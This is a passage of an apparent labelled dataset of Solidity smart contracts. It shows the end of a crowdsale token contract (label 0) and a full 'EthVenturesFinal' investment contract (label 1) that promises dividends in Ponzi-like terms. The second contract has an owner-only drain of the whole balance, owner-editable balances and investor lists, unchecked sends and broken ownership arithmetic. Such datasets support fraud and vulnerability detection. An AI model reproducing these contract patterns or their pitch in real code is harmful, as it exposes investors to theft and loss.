*\r\r\n   * This allows us to set a new owner for the upgrade mechanism.\r\r\n   *\/\r\r\n  function setUpgradeMaster(address master) public {\r\r\n      if (master == 0x0) throw;\r\r\n      if (msg.sender != upgradeMaster) throw;\r\r\n      upgradeMaster = master;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Child contract can enable to provide the condition when the upgrade can begun.\r\r\n   *\/\r\r\n  function canUpgrade() public constant returns(bool) {\r\r\n     return true;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/*\r\r\n * Ownable\r\r\n *\r\r\n * Base contract with an owner.\r\r\n * Provides onlyOwner modifier, which prevents function from running if it is called by anyone other than the owner.\r\r\n *\/\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n\r\r\n  function Ownable() {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n  modifier onlyOwner() {\r\r\n    if (msg.sender != owner) {\r\r\n      throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  function transferOwnership(address newOwner) onlyOwner {\r\r\n    if (newOwner != address(0)) {\r\r\n      owner = newOwner;\r\r\n    }\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Define interface for releasing the token transfer after a successful crowdsale.\r\r\n *\/\r\r\ncontract ReleasableToken is ERC20, Ownable {\r\r\n\r\r\n  \/* The finalizer contract that allows unlift the transfer limits on this token *\/\r\r\n  address public releaseAgent;\r\r\n\r\r\n  \/** A crowdsale contract can release us to the wild if ICO success. If false we are are in transfer lock up period.*\/\r\r\n  bool public released = false;\r\r\n\r\r\n  \/** Map of agents that are allowed to transfer tokens regardless of the lock down period. These are crowdsale contracts and possible the team multisig itself. *\/\r\r\n  mapping (address => bool) public transferAgents;\r\r\n\r\r\n  \/**\r\r\n   * Limit token transfer until the crowdsale is over.\r\r\n   *\r\r\n   *\/\r\r\n  modifier canTransfer(address _sender) {\r\r\n\r\r\n    if(!released) {\r\r\n        if(!transferAgents[_sender]) {\r\r\n            throw;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Set the contract that can call release and make the token transferable.\r\r\n   *\r\r\n   * Design choice. Allow reset the release agent to fix fat finger mistakes.\r\r\n   *\/\r\r\n  function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\r\r\n\r\r\n    \/\/ We don&#39;t do interface check here as we might want to a normal wallet address to act as a release agent\r\r\n    releaseAgent = addr;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Owner can allow a particular address (a crowdsale contract) to transfer tokens despite the lock up period.\r\r\n   *\/\r\r\n  function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\r\r\n    transferAgents[addr] = state;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * One way function to release the tokens to the wild.\r\r\n   *\r\r\n   * Can be called only from the release agent that is the final ICO contract. It is only called if the crowdsale has been success (first milestone reached).\r\r\n   *\/\r\r\n  function releaseTokenTransfer() public onlyReleaseAgent {\r\r\n    released = true;\r\r\n  }\r\r\n\r\r\n  \/** The function can be called only before or after the tokens have been releasesd *\/\r\r\n  modifier inReleaseState(bool releaseState) {\r\r\n    if(releaseState != released) {\r\r\n        throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/** The function can be called only by a whitelisted release agent. *\/\r\r\n  modifier onlyReleaseAgent() {\r\r\n    if(msg.sender != releaseAgent) {\r\r\n        throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\r\r\n    \/\/ Call StandardToken.transfer()\r\r\n   return super.transfer(_to, _value);\r\r\n  }\r\r\n\r\r\n  function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\r\r\n    \/\/ Call StandardToken.transferForm()\r\r\n    return super.transferFrom(_from, _to, _value);\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Safe unsigned safe math.\r\r\n *\r\r\n * https:\/\/blog.aragon.one\/library-driven-development-in-solidity-2bebcaf88736#.750gwtwli\r\r\n *\r\r\n * Originally from https:\/\/raw.githubusercontent.com\/AragonOne\/zeppelin-solidity\/master\/contracts\/SafeMathLib.sol\r\r\n *\r\r\n * Maintained here until merged to mainline zeppelin-solidity.\r\r\n *\r\r\n *\/\r\r\nlibrary SafeMathLib {\r\r\n\r\r\n  function times(uint a, uint b) returns (uint) {\r\r\n    uint c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function minus(uint a, uint b) returns (uint) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function plus(uint a, uint b) returns (uint) {\r\r\n    uint c = a + b;\r\r\n    assert(c>=a && c>=b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function assert(bool assertion) private {\r\r\n    if (!assertion) throw;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * A token that can increase its supply by another contract.\r\r\n *\r\r\n * This allows uncapped crowdsale by dynamically increasing the supply when money pours in.\r\r\n * Only mint agents, contracts whitelisted by owner, can mint new tokens.\r\r\n *\r\r\n *\/\r\r\ncontract MintableToken is StandardToken, Ownable {\r\r\n\r\r\n  using SafeMathLib for uint;\r\r\n\r\r\n  bool public mintingFinished = false;\r\r\n\r\r\n  \/** List of agents that are allowed to create new tokens *\/\r\r\n  mapping (address => bool) public mintAgents;\r\r\n\r\r\n  \/**\r\r\n   * Create new tokens and allocate them to an address..\r\r\n   *\r\r\n   * Only callably by a crowdsale contract (mint agent).\r\r\n   *\/\r\r\n  function mint(address receiver, uint amount) onlyMintAgent canMint public {\r\r\n    totalSupply = totalSupply.plus(amount);\r\r\n    balances[receiver] = balances[receiver].plus(amount);\r\r\n    Transfer(0, receiver, amount);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Owner can allow a crowdsale contract to mint new tokens.\r\r\n   *\/\r\r\n  function setMintAgent(address addr, bool state) onlyOwner canMint public {\r\r\n    mintAgents[addr] = state;\r\r\n  }\r\r\n\r\r\n  modifier onlyMintAgent() {\r\r\n    \/\/ Only crowdsale contracts are allowed to mint new tokens\r\r\n    if(!mintAgents[msg.sender]) {\r\r\n        throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/** Make sure we are not done yet. *\/\r\r\n  modifier canMint() {\r\r\n    if(mintingFinished) throw;\r\r\n    _;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * A crowdsaled token.\r\r\n *\r\r\n * An ERC-20 token designed specifically for crowdsales with investor protection and further development path.\r\r\n *\r\r\n * - The token transfer() is disabled until the crowdsale is over\r\r\n * - The token contract gives an opt-in upgrade path to a new contract\r\r\n * - The same token can be part of several crowdsales through approve() mechanism\r\r\n * - The token can be capped (supply set in the constructor) or uncapped (crowdsale contract can mint new tokens)\r\r\n *\r\r\n *\/\r\r\ncontract CrowdsaleToken is ReleasableToken, MintableToken, UpgradeableToken {\r\r\n\r\r\n  string public name;\r\r\n\r\r\n  string public symbol;\r\r\n\r\r\n  uint public decimals;\r\r\n\r\r\n  \/**\r\r\n   * Construct the token.\r\r\n   *\r\r\n   * This token must be created through a team multisig wallet, so that it is owned by that wallet.\r\r\n   *\/\r\r\n  function CrowdsaleToken(string _name, string _symbol, uint _initialSupply, uint _decimals)\r\r\n    UpgradeableToken(msg.sender) {\r\r\n\r\r\n    \/\/ Create any address, can be transferred\r\r\n    \/\/ to team multisig via changeOwner(),\r\r\n    \/\/ also remember to call setUpgradeMaster()\r\r\n    owner = msg.sender;\r\r\n\r\r\n    name = _name;\r\r\n    symbol = _symbol;\r\r\n\r\r\n    totalSupply = _initialSupply;\r\r\n\r\r\n    decimals = _decimals;\r\r\n\r\r\n    \/\/ Create initially all balance on the team multisig\r\r\n    balances[owner] = totalSupply;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * When token is released to be transferable, enforce no new tokens can be created.\r\r\n   *\/\r\r\n  function releaseTokenTransfer() public onlyReleaseAgent {\r\r\n    mintingFinished = true;\r\r\n    super.releaseTokenTransfer();\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow upgrade agent functionality kick in only if the crowdsale was success.\r\r\n   *\/\r\r\n  function canUpgrade() public constant returns(bool) {\r\r\n    return released;\r\r\n  }\r\r\n\r\r\n}","label":0}
{"code":"\/\/***********************************EthVenturesFinal****************************************************************************\r\r\n\/\/\r\r\n\/\/ TIRED OF POINTLESS PONZI SCHEMES? Then join EthVentures the first decentralized company!\r\r\n\/\/\r\r\n\/\/\r\r\n\/\/ EthVentures is the first decentralized ethereum based company, with shareholder function, dividends, and more...!\r\r\n\/\/\r\r\n\/\/\r\r\n\/\/ How it works: You deposit minimum 2 Ether and no maximum deposit, and you will become a shareholder, proportional to how much you deposited. You will own a % of the income of this dapp proportional to how much you deposited.\r\r\n\/\/ Ex: There is 98 Eth deposited, you deposit 2 Eth, new balance becomes 100 Eth, then you will own 2% of the profits!\r\r\n\/\/\r\r\n\/\/\r\r\n\/\/\r\r\n\/\/ Dividends: Every deposit under 2 Eth is considered a dividend and is distributed between shareholders automatically. Even if the profit is bigger than 2 Eth, it will be distributed in 1-2 Ether packages, automatically.\r\r\n\/\/ Ex: We generate 100 Eth profit daily, then it will be distributed in 50 times in 2 ether packages, then those packages get shared between shareholders. With the example above if you hold 2%, then you will earn 50 times 0.04 Eth, which is 2 Eth profit in total.\r\r\n\/\/\r\r\n\/\/\r\r\n\/\/ Profit: This contract itself is not generating any profit, it&#39;s just a ledger to keep record of investors, and pays out dividends automatically.There will be other contracts linked to this, that will send the profits here. EthVentures is just the core of this business, there will be other contracts built on it.\r\r\n\/\/ Ex: A dice game built on this contract that generates say 10 Eth daily, will send the fees directly here\r\r\n\/\/ Ex: A doubler game built on this contract that generates 50 Eth daily, that will send all fees here\r\r\n\/\/ Ex: Any other form of contract that takes a % fee, and will send the fees directly here to be distributed between EthVentures shareholders.\r\r\n\/\/\r\r\n\/\/\r\r\n\/\/ How to invest: Just deposit minimum 2 Ether to the contract address, and you can see your total investments and % ownership in the Mist wallet if you follow this contract. You can deposit multiple times too, the total investments will add up if you send from the same address. The percentage ownership is calculated with a 10 billionth point precision, so you must divide that number by 100,000,000 to get the % ownership rate. Every other information, can be seen in the contract tab from your Mist Wallet, just make sure you are subscribed to this contract.\r\r\n\/\/\r\r\n\/\/\r\r\n\/\/\r\r\n\/\/ Fees: There is a 1% deposit fee, and a 1% dividend payout fee that goes to the contract manager, everything else goes to investors!\r\r\n\/\/\r\r\n\/\/============================================================================================================================\r\r\n\/\/\r\r\n\/\/ When EthVentures will be succesful, it will have tens or hundreds of different contracts, all sending the fees here to our investors, AUTOMATICALLY. It could generate even hundreds of Eth daily at some point.\r\r\n\/\/\r\r\n\/\/ Imagine it as a decentralized web of income, all sending the money to 1 single point, this contract.\r\r\n\/\/\r\r\n\/\/ It is literally a DECENTRALIZED MONEY GENERATOR!\r\r\n\/\/\r\r\n\/\/\r\r\n\/\/============================================================================================================================\r\r\n\/\/ Copyright (c) 2016 to \"BetGod\" from Bitcointalk.org, This piece of code cannot be copied or reused without the author&#39;s permission!\r\r\n\/\/\r\r\n\/\/ Author: https:\/\/bitcointalk.org\/index.php?action=profile;u=803185\r\r\n\/\/\r\r\n\/\/ This is the final version of the contract, new and improved, all possible bugs fixed!\r\r\n\/\/\r\r\n\/\/\r\r\n\/\/***********************************START\r\r\ncontract EthVenturesFinal {\r\r\nstruct InvestorArray {\r\r\naddress etherAddress;\r\r\nuint amount;\r\r\nuint percentage_ownership; \/\/ten-billionth point precision, to get real %, just divide this number by 100,000,000\r\r\n}\r\r\nInvestorArray[] public investors;\r\r\n\/\/********************************************PUBLIC VARIABLES\r\r\nuint public total_investors=0;\r\r\nuint public fees=0;\r\r\nuint public balance = 0;\r\r\nuint public totaldeposited=0;\r\r\nuint public totalpaidout=0;\r\r\nuint public totaldividends=0;\r\r\nstring public Message_To_Investors=\"Welcome to EthVenturesFinal! New and improved! All bugs fixed!\"; \/\/ the manager can send short messages to investors\r\r\naddress public owner;\r\r\n\/\/ manager privilege\r\r\nmodifier manager { if (msg.sender == owner) _ }\r\r\n\/\/********************************************INIT\r\r\nfunction EthVenturesFinal() {\r\r\nowner = msg.sender;\r\r\n}\r\r\n\/\/********************************************TRIGGER\r\r\nfunction() {\r\r\nEnter();\r\r\n}\r\r\n\/\/********************************************ENTER\r\r\nfunction Enter() {\r\r\n\/\/DIVIDEND PAYOUT FUNCTION, IT WILL GET INCOME FROM OTHER CONTRACTS, THE DIVIDENDS WILL ALWAYS BE SENT\r\r\n\/\/IN LESS THAN 2 ETHER SIZE PACKETS, BECAUSE ANY DEPOSIT OVER 2 ETHER GETS REGISTERED AS AN INVESTOR!!!\r\r\nif (msg.value < 2 ether)\r\r\n{\r\r\nuint PRE_payout;\r\r\nuint PRE_amount=msg.value;\r\r\nowner.send(PRE_amount\/100); \/\/send the 1% management fee to the manager\r\r\ntotalpaidout+=PRE_amount\/100; \/\/update paid out amount\r\r\nPRE_amount-=PRE_amount\/100; \/\/remaining 99% is the dividend\r\r\n\/\/Distribute Dividends\r\r\nif(investors.length !=0 && PRE_amount !=0)\r\r\n{\r\r\nfor(uint PRE_i=0; PRE_i<investors.length;PRE_i++)\r\r\n{\r\r\nPRE_payout = PRE_amount * investors[PRE_i].percentage_ownership \/10000000000; \/\/calculate pay out\r\r\ninvestors[PRE_i].etherAddress.send(PRE_payout); \/\/send dividend to investor\r\r\ntotalpaidout += PRE_payout; \/\/update paid out amount\r\r\ntotaldividends+=PRE_payout; \/\/ update paid out dividends\r\r\n}\r\r\nMessage_To_Investors=\"Dividends have been paid out!\";\r\r\n}\r\r\n}\r\r\n\/\/ YOU MUST INVEST AT LEAST 2 ETHER OR HIGHER TO BE A SHAREHOLDER, OTHERWISE THE DEPOSIT IS CONSIDERED A DIVIDEND!!!\r\r\nelse\r\r\n{\r\r\n\/\/ collect management fees and update contract balance and deposited amount\r\r\nuint amount=msg.value;\r\r\nfees = amount \/ 100; \/\/ 1% management fee to the owner\r\r\ntotaldeposited+=amount; \/\/update deposited amount\r\r\namount-=amount\/100;\r\r\nbalance += amount; \/\/ balance update\r\r\n\/\/ add a new participant to the system and calculate total players\r\r\nbool alreadyinvestor =false;\r\r\nuint alreadyinvestor_id;\r\r\n\/\/go through all investors and see if the current investor was already an investor or not\r\r\nfor(uint i=0; i<investors.length;i++)\r\r\n{\r\r\nif( msg.sender== investors[i].etherAddress) \/\/ if yes then:\r\r\n{\r\r\nalreadyinvestor=true; \/\/set it to true\r\r\nalreadyinvestor_id=i; \/\/ and save the id of the investor in the investor array\r\r\nbreak; \/\/ get out of the loop to save gas, because we already found it\r\r\n}\r\r\n}\r\r\n\/\/ if it&#39;s a new investor then add it to the array\r\r\nif(alreadyinvestor==false)\r\r\n{\r\r\ntotal_investors=investors.length+1;\r\r\ninvestors.length += 1; \/\/increment first\r\r\ninvestors[investors.length-1].etherAddress = msg.sender;\r\r\ninvestors[investors.length-1].amount = amount;\r\r\ninvestors[investors.length-1].percentage_ownership = amount \/totaldeposited*10000000000;\r\r\nMessage_To_Investors=\"New Investor has joined us!\"; \/\/ a new and real investor has joined us\r\r\n\r\r\nfor(uint k=0; k<investors.length;k++) \/\/if smaller than incremented, goes into loop\r\r\n{investors[k].percentage_ownership = investors[k].amount\/totaldeposited*10000000000;} \/\/recalculate % ownership\r\r\n\r\r\n}\r\r\nelse \/\/ if its already an investor, then update his investments and his % ownership\r\r\n{\r\r\ninvestors[alreadyinvestor_id].amount += amount;\r\r\ninvestors[alreadyinvestor_id].percentage_ownership = investors[alreadyinvestor_id].amount\/totaldeposited*10000000000;\r\r\n}\r\r\n\/\/ pay out the 1% management fee\r\r\nif (fees != 0)\r\r\n{\r\r\nowner.send(fees); \/\/send the 1% to the manager\r\r\ntotalpaidout+=fees; \/\/update paid out amount\r\r\n}\r\r\n\r\r\n}\r\r\n}\r\r\n\/\/********************************************NEW MANAGER\r\r\n\/\/In case the business gets sold, the new manager will take over the management\r\r\nfunction NewOwner(address new_owner) manager\r\r\n{\r\r\nowner = new_owner;\r\r\nMessage_To_Investors=\"The contract has a new manager!\";\r\r\n}\r\r\n\/\/********************************************EMERGENCY WITHDRAW\r\r\n\/\/ It will only be used in case the funds get stuck or any bug gets discovered in the future\r\r\n\/\/ Also if a new version of this contract comes out, the funds then will be transferred to the new one\r\r\nfunction Emergency() manager\r\r\n{\r\r\nif(balance!=0)\r\r\n{\r\r\nowner.send(balance);\r\r\nbalance=0;\r\r\nMessage_To_Investors=\"Emergency Withdraw has been issued!\";\r\r\n}\r\r\n}\r\r\n\/\/********************************************EMERGENCY BALANCE RESET\r\r\n\/\/In case any errors happen the balance can be modified manually, it will only be used as last resort!\r\r\nfunction EmergencyBalanceReset(uint new_balance) manager\r\r\n{\r\r\nbalance = new_balance;\r\r\nMessage_To_Investors=\"The Balance has been edited by the Manager!\";\r\r\n}\r\r\n\/\/********************************************NEW MESSAGE\r\r\n\/\/The manager can send short messages to investors to keep them updated\r\r\nfunction NewMessage(string new_sms) manager\r\r\n{\r\r\nMessage_To_Investors = new_sms;\r\r\n}\r\r\n\/\/********************************************MANUALLY ADD INVESTORS\r\r\n\/\/The manager can add manually the investors from the previous versions, \r\r\n\/\/so that those that invested in the older versions can join us in the new and updated versions\r\r\nfunction NewManualInvestor(address new_investor , uint new_amount) manager\r\r\n{\r\r\ntotal_investors=investors.length+1;\r\r\ninvestors.length += 1; \/\/increment first\r\r\ninvestors[investors.length-1].etherAddress = new_investor;\r\r\ninvestors[investors.length-1].amount = new_amount;\r\r\ninvestors[investors.length-1].percentage_ownership = new_amount \/totaldeposited*10000000000;\r\r\n\r\r\nMessage_To_Investors=\"New manual Investor has been added by the Manager!\"; \/\/ you can see if the newest investor was manually added or not, this will add transparency to the contract, since this function should only be used in emergency situations.\r\r\n\/\/ This will ensure that the manager doesn&#39;t add fake investors of his own addresses.\r\r\n}\r\r\n\/\/********************************************MANUAL DEPOSIT\r\r\n\/\/The manager can deposit manually from previous version&#39;s balances\r\r\nfunction ManualDeposit() manager\r\r\n{\r\r\ntotaldeposited+=msg.value; \/\/update deposited amount manually\r\r\nbalance+=msg.value; \/\/update balance amount manually\r\r\n\r\r\nMessage_To_Investors = \"Manual Deposit received from the Manager\";\r\r\n}\r\r\n\r\r\n\/\/end\r\r\n}","label":1}
